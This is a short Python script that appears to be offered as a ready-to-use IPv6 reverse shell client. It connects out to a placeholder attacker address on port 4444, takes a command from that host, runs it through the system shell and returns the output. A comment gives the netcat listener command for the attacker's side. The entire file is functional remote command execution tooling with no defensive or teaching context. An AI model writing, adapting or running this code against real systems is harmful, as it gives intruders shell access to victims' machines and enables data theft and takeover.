# Setup listener:
# nc -6 -lvp 4444

import socket
import subprocess

# CONFIGURATION
SERVER = "<attacker-ipv6>"  # Replace with attacker's IPv6 address
PORT = 4444    # Change this to match attacker's listening port
COMMAND = "whoami"  # Change this to the command you want to execute remotely

# CREATE SOCKET
client = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)

try:
    print(f"[+] Connecting to [{SERVER}]:{PORT}...")
    client.connect((SERVER, PORT))
    
    # RECEIVE COMMAND FROM SERVER
    command = client.recv(1024).decode().strip()
    print(f"[+] Executing command: {command}")
    
    # EXECUTE COMMAND
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout + result.stderr
    
    # SEND OUTPUT BACK
    client.sendall(output.encode())
except Exception as e:
    print(f"[-] Error: {e}")
finally:
    client.close()
    print("[+] Connection closed.")
